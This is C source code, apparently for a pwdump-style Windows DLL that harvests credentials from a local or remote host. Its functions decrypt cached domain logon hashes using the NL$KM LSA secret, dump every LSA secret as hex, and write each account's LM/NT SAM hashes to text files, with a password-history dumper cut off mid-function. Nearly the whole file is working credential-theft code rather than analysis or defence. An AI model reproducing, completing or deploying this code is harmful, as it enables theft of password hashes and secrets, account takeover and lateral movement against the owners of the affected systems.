#include <windows.h>
#include <winnt.h>
#include <ntsecapi.h>
#include <string.h>
#include <stdio.h>
#include "md5.h"
#include "rc4.h"

typedef DWORD HPOLICY;
typedef DWORD HSECRET;
typedef DWORD HSAM;
typedef DWORD HDOMAIN;
typedef DWORD HUSER;

typedef struct _LSA_SECRET
{
	DWORD        Length;
	DWORD MaximumLength;
	WCHAR       *Buffer;
} LSA_SECRET;

typedef struct _SAM_USER_INFO
{
	DWORD               Rid;
	LSA_UNICODE_STRING Name;
} SAM_USER_INFO;

typedef struct _SAM_USER_ENUM
{
	DWORD          Count;
	SAM_USER_INFO *Users;
} SAM_USER_ENUM;

typedef NTSTATUS (WINAPI             *LsaIOpenPolicyTrusted)( HPOLICY * );
typedef NTSTATUS (WINAPI                    *LsarOpenSecret)( HPOLICY, LSA_UNICODE_STRING *, DWORD, HSECRET * );
typedef NTSTATUS (WINAPI                   *LsarQuerySecret)( HSECRET, LSA_SECRET **, DWORD, DWORD, DWORD );
typedef NTSTATUS (WINAPI                         *LsarClose)( HANDLE );
typedef NTSTATUS (WINAPI                       *SamIConnect)( DWORD, HSAM *, DWORD, DWORD );
typedef NTSTATUS (WINAPI                    *SamrOpenDomain)( HSAM, DWORD, PSID, HDOMAIN * );
typedef NTSTATUS (WINAPI                      *SamrOpenUser)( HDOMAIN, DWORD, DWORD, HUSER * );
typedef NTSTATUS (WINAPI        *SamrEnumerateUsersInDomain)( HDOMAIN, DWORD *, DWORD, SAM_USER_ENUM **, DWORD, VOID * );
typedef NTSTATUS (WINAPI          *SamrQueryInformationUser)( HUSER, DWORD, VOID * );
typedef HLOCAL   (WINAPI   *SamIFree_SAMPR_USER_INFO_BUFFER)( VOID *, DWORD );
typedef HLOCAL   (WINAPI *SamIFree_SAMPR_ENUMERATION_BUFFER)( SAM_USER_ENUM * );
typedef NTSTATUS (WINAPI                   *SamrCloseHandle)( DWORD * );
typedef NTSTATUS (WINAPI                *SamIGetPrivateData)( HUSER, DWORD *, DWORD *, DWORD *, PVOID * );
typedef NTSTATUS (WINAPI                 *SystemFunction025)( VOID *, DWORD *, BYTE[ 32 ] );
typedef NTSTATUS (WINAPI                 *SystemFunction027)( VOID *, DWORD *, BYTE[ 32 ] );

#define SAM_USER_INFO_PASSWORD_OWFS 0x12
#define SAM_HISTORY_COUNT_OFFSET    0x3C
#define SAM_HISTORY_NTLM_OFFSET     0x3C

VOID     WriteToErrorLog( CHAR *szErrorMsg );
VOID         DumpPWCache( VOID );
VOID      DumpLSASecrets( VOID );
VOID      DumpSecretData( unsigned char *p, DWORD dwSize );
BOOL      IsReadableChar( INT nChar );
VOID        DumpPWHashes( VOID );
VOID DumpPWHistoryHashes( VOID );
VOID   EncryptOutputFile( CHAR *szFile );
CHAR          *Obfuscate( CHAR *szData );

VOID __declspec( dllexport )DumpLSAInfo( BOOL bDumpPWCache, BOOL bDumpLSASecrets, BOOL bDumpPWHashes, BOOL bDumpPWHistoryHashes )
{
	LONG           lReturn;
	HKEY              hKey;
	CHAR  szCurrentVersion[ 128 ];
	DWORD     dwBufferSize;
	CHAR    szMajorVersion[ 2 ];

	if ( bDumpPWCache )
	{
		lReturn = RegConnectRegistry( NULL, HKEY_LOCAL_MACHINE, &hKey );

		if ( lReturn == ERROR_SUCCESS )
		{
			lReturn = RegOpenKeyEx( hKey, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", 0, KEY_QUERY_VALUE, &hKey );

			if ( lReturn == ERROR_SUCCESS )
			{
				strcpy( szCurrentVersion, "" );

				dwBufferSize = 128;

				lReturn = RegQueryValueEx( hKey, "CurrentVersion", NULL, NULL, (BYTE *)szCurrentVersion, &dwBufferSize );

				if ( lReturn == ERROR_SUCCESS )
				{
					if ( strcmp( szCurrentVersion, "" ) != 0 )
					{
						szMajorVersion[0] = szCurrentVersion[0];
						szMajorVersion[1] = '\0';

						if ( atoi( szMajorVersion ) > 4 )
						{
							DumpPWCache();
						}
					}
				}
				else
				{
					WriteToErrorLog( "ERROR! Cannot read registry value HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\\\CurrentVersion on remote host.\n" );
				}
			}
			else
			{
				WriteToErrorLog( "ERROR! Cannot open registry key HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion on remote host.\n" );
			}

			RegCloseKey( hKey );
		}
		else
		{
			WriteToErrorLog( "ERROR! Cannot open registry key HKLM on remote host.\n" );
		}

		EncryptOutputFile( "PWCache.txt" );
	}

	if ( bDumpLSASecrets )
	{
		DumpLSASecrets();

		EncryptOutputFile( "LSASecrets.txt" );
	}

	if ( bDumpPWHashes )
	{
		DumpPWHashes();

		EncryptOutputFile( "PWHashes.txt" );
	}

	if ( bDumpPWHistoryHashes )
	{
		DumpPWHistoryHashes();

		EncryptOutputFile( "PWHistoryHashes.txt" );
	}
}

VOID WriteToErrorLog( CHAR szErrorMsg[] )
{
	FILE *pOutputFile;

	pOutputFile = fopen( "ErrorLog.txt", "r" );

	if ( pOutputFile != NULL )
	{
		fclose( pOutputFile );
	}
	else
	{
		pOutputFile = fopen( "ErrorLog.txt", "w" );

		if ( pOutputFile != NULL )
		{
			fclose( pOutputFile );
		}
	}

	pOutputFile = fopen( "ErrorLog.txt", "a+" );

	if ( pOutputFile != NULL )
	{
		fprintf( pOutputFile, "%s", szErrorMsg );

		fclose( pOutputFile );
	}
}

VOID DumpPWCache( VOID )
{
	HINSTANCE                            hLSASrv;
	LsaIOpenPolicyTrusted pLsaIOpenPolicyTrusted;
	LsarOpenSecret               pLsarOpenSecret;
	LsarQuerySecret             pLsarQuerySecret;
	LsarClose                         pLsarClose;
	HPOLICY                              hPolicy;
	NTSTATUS                             nStatus;
	CHAR                                szSecret[ 512 ];
	WCHAR                              wszSecret[ 1024 ];
	LSA_UNICODE_STRING                 lusSecret;
	BOOL                               bContinue;
	HSECRET                              hSecret;
	LSA_SECRET                          *lsaData;
	unsigned char                       *pLsaKey;
	DWORD                               dwStatus;
	BYTE                                  k_ipad[ 64 ];
	BYTE                                  k_opad[ 64 ];
	HKEY                              hKeyCaches;
	INT                                        i;
	CHAR                              szCacheKey[ 8 ];
	DWORD                                 dwSize;
	BYTE                               bCacheVal[ 4096 ];
	DWORD                             dwUsername;
	DWORD                               dwDomain;
	DWORD                            dwDNSDomain;
	DWORD                                      j;
	BYTE                                   bKey1[ 64 ];
	BYTE                                   bKey2[ 64 ];
	md5_context                           md5Ctx;
	BYTE                                 bDigest[ 16 ];
	DWORD                                 dwJoke[ 2 ];
	DWORD                                      k;
	CHAR                              szUsername[ 128 ];
	CHAR                                szDomain[ 128 ];
	CHAR                             szDNSDomain[ 128 ];
	FILE                            *pOutputFile;

	struct rc4_state rc4State;

	hLSASrv = LoadLibrary( "lsasrv.dll" );

	pLsaIOpenPolicyTrusted = (LsaIOpenPolicyTrusted)GetProcAddress( hLSASrv, "LsaIOpenPolicyTrusted" );
	pLsarOpenSecret        =        (LsarOpenSecret)GetProcAddress( hLSASrv, "LsarOpenSecret" );
	pLsarQuerySecret       =       (LsarQuerySecret)GetProcAddress( hLSASrv, "LsarQuerySecret" );
	pLsarClose             =             (LsarClose)GetProcAddress( hLSASrv, "LsarClose" );

	if ( pLsaIOpenPolicyTrusted && pLsarOpenSecret && pLsarQuerySecret && pLsarClose )
	{
		hPolicy = 0;

		nStatus = pLsaIOpenPolicyTrusted( &hPolicy );

		if ( nStatus >= 0 )
		{
			strcpy( szSecret, "NL$KM" );

			MultiByteToWideChar( CP_ACP, 0, szSecret, strlen( szSecret ) + 1, wszSecret, sizeof( wszSecret ) / sizeof( wszSecret[0] ) );

			lusSecret.Buffer        = wszSecret;
			lusSecret.Length        = wcslen( wszSecret ) * 2;
			lusSecret.MaximumLength = lusSecret.Length;

			bContinue = FALSE;

			hSecret = 0;

			nStatus = pLsarOpenSecret( hPolicy, &lusSecret, 2, &hSecret );

			if ( nStatus < 0 )
			{
				lusSecret.Length        += 2;
				lusSecret.MaximumLength += 2;

				nStatus = pLsarOpenSecret( hPolicy, &lusSecret, 2, &hSecret );

				if ( nStatus >= 0 )
				{
					bContinue = TRUE;
				}
			}
			else
			{
				bContinue = TRUE;
			}

			if ( bContinue )
			{
				lsaData = NULL;

				nStatus = pLsarQuerySecret( hSecret, &lsaData, 0, 0, 0 );

				if ( nStatus >= 0 )
				{
					if ( lsaData != NULL )
					{
						pLsaKey = (CHAR *)lsaData->Buffer;

						dwStatus = RegOpenKeyEx( HKEY_LOCAL_MACHINE, "SECURITY\\Cache", 0, KEY_READ, &hKeyCaches );

						if ( dwStatus == ERROR_SUCCESS )
						{
							memset( k_ipad, 0x36, 64 );
							memset( k_opad, 0x5c, 64 );

							for ( i = 1; TRUE; i++ )
							{
								sprintf( szCacheKey, "NL$%d", i );

								dwSize = 4096;

								dwStatus = RegQueryValueEx( hKeyCaches, szCacheKey, NULL, NULL, (BYTE *)bCacheVal, &dwSize );

								if ( dwStatus != ERROR_SUCCESS )
								{
									break;
								}

								if ( dwSize != 0 )
								{
									dwUsername  = bCacheVal[0];
									dwDomain    = bCacheVal[2];
									dwDNSDomain = bCacheVal[60];

									if ( dwUsername != 0 )
									{
										for ( j = 0; j < 64; j++ )
										{
											bKey1[j] = pLsaKey[j] ^ k_ipad[j];
											bKey2[j] = pLsaKey[j] ^ k_opad[j];
										}

										md5_starts( &md5Ctx );
										md5_update( &md5Ctx, bKey1, 64 );
										md5_update( &md5Ctx, bCacheVal + 64, 16 );
										md5_finish( &md5Ctx, bDigest );

										md5_starts( &md5Ctx );
										md5_update( &md5Ctx, bKey2, 64 );
										md5_update( &md5Ctx, bDigest, 16 );
										md5_finish( &md5Ctx, bDigest );

						  				rc4_setup( &rc4State, bDigest, 16 );
										rc4_crypt( &rc4State, bCacheVal + 96, dwSize - 96 );

										dwJoke[0] = 2 * ( ( dwUsername / 2 ) % 2 );
										dwJoke[1] = 2 * ( ( dwDomain / 2 ) % 2 );

										k = 0;

										for ( j = 0; j < dwUsername; j = j + 2 )
										{
											szUsername[k] = bCacheVal[168 + j];

											k++;
										}

										szUsername[k] = '\0';

										k = 0;

										for ( j = 0; j < dwDomain; j = j + 2 )
										{
											szDomain[k] = bCacheVal[168 + dwUsername + dwJoke[0] + j];

											k++;
										}

										szDomain[k] = '\0';

										k = 0;

										for ( j = 0; j < dwDNSDomain; j = j + 2 )
										{
											szDNSDomain[k] = bCacheVal[168 + dwUsername + dwJoke[0] + dwDomain + dwJoke[1] + j];

											k++;
										}

										szDNSDomain[k] = '\0';

										pOutputFile = fopen( "PWCache.txt", "r" );

										if ( pOutputFile != NULL )
										{
											fclose( pOutputFile );
										}
										else
										{
											pOutputFile = fopen( "PWCache.txt", "w" );

											if ( pOutputFile != NULL )
											{
												fclose( pOutputFile );
											}
										}

										pOutputFile = fopen( "PWCache.txt", "a+" );

										if ( pOutputFile != NULL )
										{
											fprintf( pOutputFile, "%s:", szUsername );

											for ( j = 0; j < 16; j++ )
											{
												fprintf( pOutputFile, "%02X", bCacheVal[96 + j] );
											}

											fprintf( pOutputFile, ":%s:%s\n", szDomain, szDNSDomain );

											fclose( pOutputFile );
										}
									}
								}
							}

							RegCloseKey( hKeyCaches );
						}
						else
						{
							WriteToErrorLog( "ERROR! Cannot open registry key HKLM\\SECURITY\\Cache on remote host.\n" );
						}
					}

					LsaFreeMemory( lsaData );
				}
				else
				{
					WriteToErrorLog( "ERROR! Cannot query LSA Secret on remote host.\n" );
				}

				pLsarClose( &hSecret );
			}

			pLsarClose( &hPolicy );
		}
		else
		{
			WriteToErrorLog( "ERROR! Cannot open trusted LSA policy on remote host.\n" );
		}

		FreeLibrary( hLSASrv );
	}
	else
	{
		WriteToErrorLog( "ERROR! Cannot load LSA functions on remote host.\n" );
	}
}

VOID DumpLSASecrets( VOID )
{
	HINSTANCE                            hLSASrv;
	LsaIOpenPolicyTrusted pLsaIOpenPolicyTrusted;
	LsarOpenSecret               pLsarOpenSecret;
	LsarQuerySecret             pLsarQuerySecret;
	LsarClose                         pLsarClose;
	HPOLICY                              hPolicy;
	NTSTATUS                             nStatus;
	DWORD                               dwStatus;
	HKEY                             hKeySecrets;
	INT                                        i;
	WCHAR                              wszSecret[ 1024 ];
	LSA_UNICODE_STRING                 lusSecret;
	HSECRET                              hSecret;
	LSA_SECRET                          *lsaData;
	CHAR                                szSecret[ 512 ];
	FILE                            *pOutputFile;

	hLSASrv = LoadLibrary( "lsasrv.dll" );

	pLsaIOpenPolicyTrusted = (LsaIOpenPolicyTrusted)GetProcAddress( hLSASrv, "LsaIOpenPolicyTrusted" );
	pLsarOpenSecret        =        (LsarOpenSecret)GetProcAddress( hLSASrv, "LsarOpenSecret" );
	pLsarQuerySecret       =       (LsarQuerySecret)GetProcAddress( hLSASrv, "LsarQuerySecret" );
	pLsarClose             =             (LsarClose)GetProcAddress( hLSASrv, "LsarClose" );

	if ( pLsaIOpenPolicyTrusted && pLsarOpenSecret && pLsarQuerySecret && pLsarClose )
	{
		hPolicy = 0;

		nStatus = pLsaIOpenPolicyTrusted( &hPolicy );

		if ( nStatus >= 0 )
		{
			dwStatus = RegOpenKeyEx( HKEY_LOCAL_MACHINE, "SECURITY\\Policy\\Secrets", 0, KEY_READ, &hKeySecrets );

			if ( dwStatus == ERROR_SUCCESS )
			{
				for ( i = 0; TRUE; i++ )
				{
					dwStatus = RegEnumKeyW( hKeySecrets, i, wszSecret, sizeof( wszSecret ) / 2 );

					if ( dwStatus != ERROR_SUCCESS )
					{
						break;
					}

					lusSecret.Buffer        = wszSecret;
					lusSecret.Length        = wcslen( wszSecret ) * 2;
					lusSecret.MaximumLength = lusSecret.Length;

					hSecret = 0;

					nStatus = pLsarOpenSecret( hPolicy, &lusSecret, 2, &hSecret );

					if ( nStatus < 0 )
					{
						lusSecret.Length        += 2;
						lusSecret.MaximumLength += 2;

						nStatus = pLsarOpenSecret( hPolicy, &lusSecret, 2, &hSecret );

						if ( nStatus < 0 )
						{
							continue;
						}
					}

					lsaData = NULL;

					nStatus = pLsarQuerySecret( hSecret, &lsaData, 0, 0, 0 );

					if ( nStatus >= 0 )
					{
						WideCharToMultiByte( CP_ACP, 0, wszSecret, wcslen( wszSecret ) * 2, szSecret, sizeof( szSecret ), NULL, NULL );

						pOutputFile = fopen( "LSASecrets.txt", "r" );

						if ( pOutputFile != NULL )
						{
							fclose( pOutputFile );
						}
						else
						{
							pOutputFile = fopen( "LSASecrets.txt", "w" );

							if ( pOutputFile != NULL )
							{
								fclose( pOutputFile );
							}
						}

						pOutputFile = fopen( "LSASecrets.txt", "a+" );

						if ( pOutputFile != NULL )
						{
							fprintf( pOutputFile, "%s\n", szSecret );

							fclose( pOutputFile );
						}

						if ( lsaData != NULL )
						{
							DumpSecretData( (CHAR *)lsaData->Buffer, lsaData->Length );

							pOutputFile = fopen( "LSASecrets.txt", "a+" );

							if ( pOutputFile != NULL )
							{
								fprintf( pOutputFile, "\n" );

								fclose( pOutputFile );
							}
						}

						LsaFreeMemory( lsaData );
					}
					else
					{
						WriteToErrorLog( "ERROR! Cannot query LSA Secret on remote host.\n" );
					}

					pLsarClose( &hSecret );
				}

				RegCloseKey( hKeySecrets );
			}
			else
			{
				WriteToErrorLog( "ERROR! Cannot open registry key HKLM\\SECURITY\\Policy\\Secrets on remote host.\n" );
			}

			pLsarClose( &hPolicy );
		}
		else
		{
			WriteToErrorLog( "ERROR! Cannot open trusted LSA policy on remote host.\n" );
		}

		FreeLibrary( hLSASrv );
	}
	else
	{
		WriteToErrorLog( "ERROR! Cannot load LSA functions on remote host.\n" );
	}
}

VOID DumpSecretData( unsigned char *p, DWORD dwSize )
{
	CHAR   szDumpBuff[ 256 ];
	FILE *pOutputFile;
	INT             i;
	INT             j;
	CHAR szTempBuffer[ 17 ];

	while ( dwSize > 16 )
	{
		sprintf( szDumpBuff, " %02X %02X %02X %02X %02X %02X %02X %02X %02X %02X %02X %02X %02X %02X %02X %02X  %c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c",
				     p[0], p[1], p[2], p[3], p[4], p[5], p[6], p[7], p[8], p[9], p[10], p[11], p[12], p[13], p[14], p[15],
				     IsReadableChar( p[0] ) ? p[0] : '.',
				     IsReadableChar( p[1] ) ? p[1] : '.',
				     IsReadableChar( p[2] ) ? p[2] : '.',
				     IsReadableChar( p[3] ) ? p[3] : '.',
				     IsReadableChar( p[4] ) ? p[4] : '.',
				     IsReadableChar( p[5] ) ? p[5] : '.',
				     IsReadableChar( p[6] ) ? p[6] : '.',
				     IsReadableChar( p[7] ) ? p[7] : '.',
				     IsReadableChar( p[8] ) ? p[8] : '.',
				     IsReadableChar( p[9] ) ? p[9] : '.',
				     IsReadableChar( p[10] ) ? p[10] : '.',
				     IsReadableChar( p[11] ) ? p[11] : '.',
				     IsReadableChar( p[12] ) ? p[12] : '.',
				     IsReadableChar( p[13] ) ? p[13] : '.',
				     IsReadableChar( p[14] ) ? p[14] : '.',
				     IsReadableChar( p[15] ) ? p[15] : '.' );

		pOutputFile = fopen( "LSASecrets.txt", "a+" );

		if ( pOutputFile != NULL )
		{
			fprintf( pOutputFile, "%s\n", szDumpBuff );

			fclose( pOutputFile );
		}

		p += 16;

		dwSize -= 16;
	}

	if ( dwSize > 0 )
	{
		i = 0;
		j = 16 - dwSize;

		memset( szTempBuffer, 0, sizeof( szTempBuffer ) );

		szDumpBuff[0] = 0;

		while ( dwSize-- )
		{
			sprintf( szDumpBuff + strlen( szDumpBuff ), " %02X", *p );

			if ( IsReadableChar( *p ) )
			{
				szTempBuffer[i++] = *p;
			}
			else
			{
				szTempBuffer[i++] = '.';
			}

			p++;
		}

		sprintf( szDumpBuff + strlen( szDumpBuff ), "%*s%s", j * 3 + 2, "", szTempBuffer );

		pOutputFile = fopen( "LSASecrets.txt", "a+" );

		if ( pOutputFile != NULL )
		{
			fprintf( pOutputFile, "%s\n", szDumpBuff );

			fclose( pOutputFile );
		}
	}
}

BOOL IsReadableChar( INT nChar )
{
	BOOL bReturn;

	bReturn = FALSE;

	if ( ( nChar >= ' ' ) && ( nChar <= '~' ) )
	{
		bReturn = TRUE;
	}

	return bReturn;
}

VOID DumpPWHashes( VOID )
{
	HINSTANCE                                                    hSAMSrv;
	SamIConnect                                             pSamIConnect;
	SamrOpenDomain                                       pSamrOpenDomain;
	SamrOpenUser                                           pSamrOpenUser;
	SamrQueryInformationUser                   pSamrQueryInformationUser;
	SamrEnumerateUsersInDomain               pSamrEnumerateUsersInDomain;
	SamIFree_SAMPR_USER_INFO_BUFFER     pSamIFree_SAMPR_USER_INFO_BUFFER;
	SamIFree_SAMPR_ENUMERATION_BUFFER pSamIFree_SAMPR_ENUMERATION_BUFFER;
	SamrCloseHandle                                     pSamrCloseHandle;
	LSA_OBJECT_ATTRIBUTES                                  loaAttributes;
	LSA_UNICODE_STRING                                        *lusTarget;
	LSA_HANDLE                                                      hLSA;
	NTSTATUS                                                     nStatus;
	POLICY_ACCOUNT_DOMAIN_INFO                              *pDomainInfo;
	HSAM                                                            hSAM;
	HDOMAIN                                                      hDomain;
	DWORD                                                         dwEnum;
	SAM_USER_ENUM                                               *sueEnum;
	NTSTATUS                                                 nEnumStatus;
	DWORD                                                       dwNumber;
	DWORD                                                              i;
	HUSER                                                          hUser;
	VOID                                                      *pHashData;
	CHAR                                                      szUsername[ 256 ];
	DWORD                                                         dwSize;
	unsigned                                                    HashData[ 8 ];
	BYTE                                                      *bHashData;
	CHAR                                                        szLMHash[ 40 ];
	CHAR                                                              *p;
	DWORD                                                              j;
	CHAR                                                        szNTHash[ 40 ];
	FILE                                                    *pOutputFile;

	hSAMSrv = LoadLibrary( "samsrv.dll" );

	pSamIConnect                       =                       (SamIConnect)GetProcAddress( hSAMSrv, "SamIConnect" );
	pSamrOpenDomain                    =                    (SamrOpenDomain)GetProcAddress( hSAMSrv, "SamrOpenDomain" );
	pSamrOpenUser                      =                      (SamrOpenUser)GetProcAddress( hSAMSrv, "SamrOpenUser" );
	pSamrQueryInformationUser          =          (SamrQueryInformationUser)GetProcAddress( hSAMSrv, "SamrQueryInformationUser" );
	pSamrEnumerateUsersInDomain        =        (SamrEnumerateUsersInDomain)GetProcAddress( hSAMSrv, "SamrEnumerateUsersInDomain" );
	pSamIFree_SAMPR_USER_INFO_BUFFER   =   (SamIFree_SAMPR_USER_INFO_BUFFER)GetProcAddress( hSAMSrv, "SamIFree_SAMPR_USER_INFO_BUFFER" );
	pSamIFree_SAMPR_ENUMERATION_BUFFER = (SamIFree_SAMPR_ENUMERATION_BUFFER)GetProcAddress( hSAMSrv, "SamIFree_SAMPR_ENUMERATION_BUFFER" );
	pSamrCloseHandle                   =                   (SamrCloseHandle)GetProcAddress( hSAMSrv, "SamrCloseHandle" );

	if ( pSamIConnect && pSamrOpenDomain && pSamrOpenUser && pSamrQueryInformationUser && pSamrEnumerateUsersInDomain && pSamIFree_SAMPR_USER_INFO_BUFFER && pSamIFree_SAMPR_ENUMERATION_BUFFER && pSamrCloseHandle )
	{
		memset( &loaAttributes, 0, sizeof( LSA_OBJECT_ATTRIBUTES ) );

		loaAttributes.Length = sizeof( LSA_OBJECT_ATTRIBUTES );

		lusTarget = NULL;

		hLSA = NULL;

		nStatus = LsaOpenPolicy( lusTarget, &loaAttributes, POLICY_ALL_ACCESS, &hLSA );

		if ( nStatus >= 0 )
		{
			pDomainInfo = NULL;

			nStatus = LsaQueryInformationPolicy( hLSA, PolicyAccountDomainInformation, (PVOID *)&pDomainInfo );

			if ( nStatus >= 0 )
			{
				hSAM = 0;

				nStatus = pSamIConnect( 0, &hSAM, MAXIMUM_ALLOWED, 1 );

				if ( nStatus >= 0 )
				{
					hDomain = 0;

					nStatus = pSamrOpenDomain( hSAM, 0xf07ff, pDomainInfo->DomainSid, &hDomain );

					if ( nStatus >= 0 )
					{
						dwEnum = 0;

						do
						{
							sueEnum = NULL;

							nEnumStatus = pSamrEnumerateUsersInDomain( hDomain, &dwEnum, 0, &sueEnum, 1000, &dwNumber );

							if ( nEnumStatus == 0 || nEnumStatus == 0x105 )
							{
								for ( i = 0; i < dwNumber; i++ )
								{
									hUser = 0;

									nStatus = pSamrOpenUser( hDomain, MAXIMUM_ALLOWED, sueEnum->Users[i].Rid, &hUser );

									if ( nStatus >= 0 )
									{
										pHashData = NULL;

										nStatus = pSamrQueryInformationUser( hUser, SAM_USER_INFO_PASSWORD_OWFS, &pHashData );

										if ( nStatus >= 0 )
										{
											memset( szUsername, 0, sizeof( szUsername ) );

											dwSize = min( sizeof( szUsername ), sueEnum->Users[i].Name.Length >> 1 );

											wcstombs( szUsername, sueEnum->Users[i].Name.Buffer, dwSize );

											memcpy( HashData, pHashData, 32 );

											bHashData = (BYTE *)HashData;

											if ( ( HashData[4] == 0x35b4d3aa ) && ( HashData[5] == 0xee0414b5 ) && ( HashData[6] == 0x35b4d3aa ) && ( HashData[7] == 0xee0414b5 ) )
											{
												sprintf( szLMHash, "NO PASSWORD*********************" );
											}
											else
											{
												p = szLMHash;

												for ( j = 16; j < 32; j++ )
												{
													sprintf( p, "%02X", bHashData[j] );

													p += 2;
												}
											}

											if ( ( HashData[0] == 0xe0cfd631 ) && ( HashData[1] == 0x31e96ad1 ) && ( HashData[2] == 0xd7593cb7 ) && ( HashData[3] == 0xc089c0e0 ) )
											{
												sprintf( szNTHash, "NO PASSWORD*********************" );
											}
											else
											{
												p = szNTHash;

												for ( j = 0; j < 16; j++ )
												{
													sprintf( p, "%02X", bHashData[j] );

													p += 2;
												}
											}

											pOutputFile = fopen( "PWHashes.txt", "r" );

											if ( pOutputFile != NULL )
											{
												fclose( pOutputFile );
											}
											else
											{
												pOutputFile = fopen( "PWHashes.txt", "w" );

												if ( pOutputFile != NULL )
												{
													fclose( pOutputFile );
												}
											}

											pOutputFile = fopen( "PWHashes.txt", "a+" );

											if ( pOutputFile != NULL )
											{
												fprintf( pOutputFile, "%s:%d:%s:%s:::\n", szUsername, sueEnum->Users[i].Rid, szLMHash, szNTHash );

												fclose( pOutputFile );
											}

											pSamIFree_SAMPR_USER_INFO_BUFFER( pHashData, SAM_USER_INFO_PASSWORD_OWFS );
										}

										pSamrCloseHandle( &hUser );
									}
								}

								pSamIFree_SAMPR_ENUMERATION_BUFFER( sueEnum );
							}
						} while ( nEnumStatus == 0x105 );

						pSamrCloseHandle( &hDomain );
					}
					else
					{
						WriteToErrorLog( "ERROR! Cannot open SAM on remote host.\n" );
					}

					pSamrCloseHandle( &hSAM );
				}
				else
				{
					WriteToErrorLog( "ERROR! Cannot connect to SAM on remote host.\n" );
				}

				LsaFreeMemory( pDomainInfo );
			}
			else
			{
				WriteToErrorLog( "ERROR! Cannot query LSA information policy on remote host.\n" );
			}

			LsaClose( hLSA );
		}
		else
		{
			WriteToErrorLog( "ERROR! Cannot open LSA policy on remote host.\n" );
		}

		FreeLibrary( hSAMSrv );
	}
	else
	{
		WriteToErrorLog( "ERROR! Cannot load SAM functions on remote host.\n" );
	}
}

VOID DumpPWHistoryHashes( VOID )
{
	HINSTANCE                                                    hSAMSrv;
	HINSTANCE                                                  hAdvapi32;
	SamIConnect                                             pSamIConnect;
	SamrOpenDomain                                       pSamrOpenDomain;
	SamrOpenUser                                           pSamrOpenUser;
	SamrQueryInformationUser                   pSamrQueryInformationUser;
	SamrEnumerateUsersInDomain               pSamrEnumerateUsersInDomain;
	SamIFree_SAMPR_USER_INFO_BUFFER     pSamIFree_SAMPR_USER_INFO_BUFFER;
	SamIFree_SAMPR_ENUMERATION_BUFFER pSamIFree_SAMPR_ENUMERATION_BUFFER;
	SamrCloseHandle                                     pSamrCloseHandle;
	SamIGetPrivateData                               pSamIGetPrivateData;
	SystemFunction025                                 pSystemFunction025;
	SystemFunction027                                 pSystemFunction027;
	LSA_OBJECT_ATTRIBUTES                                  loaAttributes;
	LSA_UNICODE_STRING                                        *lusTarget;
	LSA_HANDLE                                                      hLSA;
	NTSTATUS                                                     nStatus;
	POLICY_ACCOUNT_DOMAIN_INFO                              *pDomainInfo;
	HSAM                                                            hSAM;
	HDOMAIN                                                      hDomain;
	DWORD                                                         dwEnum;
	SAM_USER_ENUM                                               *sueEnum;
	NTSTATUS                                                 nEnumStatus;
	DWORD                                                       dwNumber;
	DWORD                                                              i;
	HUSER                                                          hUser;
	VOID                                                      *pHashData;
	CHAR                                                      szUsername[ 256 ];
	DWORD                                                         dwSize;
	unsigned                                                    HashData[ 64 ];
	BYTE                                                      *bHashData;
	CHAR                                                        szLMHash[ 40 ];
	CHAR                                                              *p;
	DWORD                                                              j;
	CHAR                                                        szNTHash[ 40 ];
	FILE                                                    *pOutputFile;
	DWORD                                                        dwTemp1;
	DWORD                                                        dwTemp2;
	VOID                                               *pHashDataHistory;
	DWORD                                                       dwHashes;
	DWORD                                                       dwOffset;
	VOID                                               *pCurrentHashData;
	DWORD                                                              k;

	hSAMSrv   = LoadLibrary( "samsrv.dll" );
	hAdvapi32 = LoadLibrary( "advapi32.dll" );

	pSamIConnect                       =                       (SamIConnect)GetProcAddress( hSAMSrv, "SamIConnect" );
	pSamrOpenDomain                    =                    (SamrOpenDomain)GetProcAddress( hSAMSrv, "SamrOpenDomain" );
	pSamrOpenUser                      =                      (SamrOpenUser)GetProcAddress( hSAMSrv, "SamrOpenUser" );
	pSamrQueryInformationUser          =          (SamrQueryInformationUser)GetProcAddress( hSAMSrv, "SamrQueryInformationUser" );
	pSamrEnumerateUsersInDomain        =        (SamrEnumerateUsersInDomain)GetProcAddress( hSAMSrv, "SamrEnumerateUsersInDomain" );
	pSamIFree_SAMPR_USER_INFO_BUFFER   =   (SamIFree_SAMPR_USER_INFO_BUFFER)GetProcAddress( hSAMSrv, "SamIFree_SAMPR_USER_INFO_BUFFER" );
	pSamIFree_SAMPR_ENUMERATION_BUFFER = (SamIFree_SAMPR_ENUMERATION_BUFFER)GetProcAddress( hSAMSrv, "SamIFree_SAMPR_ENUMERATION_BUFFER" );
	pSamrCloseHandle                   =                   (SamrCloseHandle)GetProcAddress( hSAMSrv, "SamrCloseHandle" );
	pSamIGetPrivateData                =                (SamIGetPrivateData)GetProcAddress( hSAMSrv, "SamIGetPrivateData" );
	pSystemFunction025                 =                 (SystemFunction025)GetProcAddress( hAdvapi32, "SystemFunction025" );
	pSystemFunction027                 =                 (SystemFunction027)GetProcAddress( hAdvapi32, "SystemFunction027" );

	if ( pSamIConnect && pSamrOpenDomain && pSamrOpenUser && pSamrQueryInformationUser && pSamrEnumerateUsersInDomain && pSamIFree_SAMPR_USER_INFO_BUFFER && pSamIFree_SAMPR_ENUMERATION_BUFFER && pSamrCloseHandle && pSamIGetPrivateData && pSystemFunction025 && pSystemFunction027 )
	{
		memset( &loaAttributes, 0, sizeof( LSA_OBJECT_ATTRIBUTES ) );

		loaAttributes.Length = sizeof( LSA_OBJECT_ATTRIBUTES );

		lusTarget = NULL;

		hLSA = NULL;

		nStatus = LsaOpenPolicy( lusTarget, &loaAttributes, POLICY_ALL_ACCESS, &hLSA );

		if ( nStatus >= 0 )
		{
			nStatus = LsaQueryInformationPolicy( hLSA, PolicyAccountDomainInformation, (PVOID *)&pDomainInfo );

			if ( nStatus >= 0 )
			{
				hSAM = 0;

				nStatus = pSamIConnect( 0, &hSAM, MAXIMUM_ALLOWED, 1 );

				if ( nStatus >= 0 )
				{
					hDomain = 0;

					nStatus = pSamrOpenDomain( hSAM, 0xf07ff, pDomainInfo->DomainSid, &hDomain );

					if ( nStatus >= 0 )
					{
						dwEnum = 0;

						do
						{
							sueEnum = NULL;

							nEnumStatus = pSamrEnumerateUsersInDomain( hDomain, &dwEnum, 0, &sueEnum, 1000, &dwNumber );

							if ( nEnumStatus == 0 || nEnumStatus == 0x105 )
							{
